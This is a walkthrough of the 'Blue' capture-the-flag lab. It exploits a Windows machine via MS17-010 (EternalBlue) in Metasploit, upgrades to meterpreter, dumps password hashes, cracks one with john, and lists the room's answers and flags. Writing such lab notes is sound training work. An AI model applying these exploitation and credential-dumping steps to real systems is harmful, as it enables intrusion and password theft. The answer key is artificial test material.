# Notes for the room "Blue"

## Tasks 


### Task 1

Running a nmap scan on the target IP: 10.10.127.11. Note the target will not respond to ping. Remember by using the `--script vuln` then you can get the vulnerabilities. 

```
nmap -sC -sV --script vuln -oN nmap/initial 10.10.127.11
```

How many ports are open with a port number under 1000?

```
3
```

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

```
ms17-010
```

### Task 2

Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

```
search ms17-010

exploit/windows/smb/ms17_010_eternalblue
```

Show options and set the one required value. What is the name of this value? (All caps for submission)

```
info NUMBER

RHOSTS
```

### Task 3

If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 


```
post/multi/manage/shell_to_meterpreter
```

Select this (use MODULE_PATH). Show options, what option are we required to change?

```
SESSION
```

Set the required option, you may need to list all of the sessions to find your target here. 

```
sessions -l
set SESSION 1
```

Found the spoolsv.exe process and migrated to that. First list processes with `ps` and migrate with `migrate ID`.

### Task 4

Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

```
Jon
```

Copy this password hash to a file and research how to crack it. What is the cracked password?

```
└─$ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)
1g 0:00:00:00 DONE (2021-05-21 05:28) 1.351g/s 13784Kp/s 13784Kc/s 13784KC/s alqui..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed

```

### Task 5

Flag1? This flag can be found at the system root. 

```
Go to the C: drive
flag{access_the_machine}
```

Flag2? This flag can be found at the location where passwords are stored within Windows.



*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.*

```
Go to c:\Windows\System32\Config\
flag{sam_database_elevated_access}
```

flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 

```
Go to C:\Users\Jon\Documents

meterpreter > cat flag3.txt 
flag{admin_documents_can_be_valuable}
```

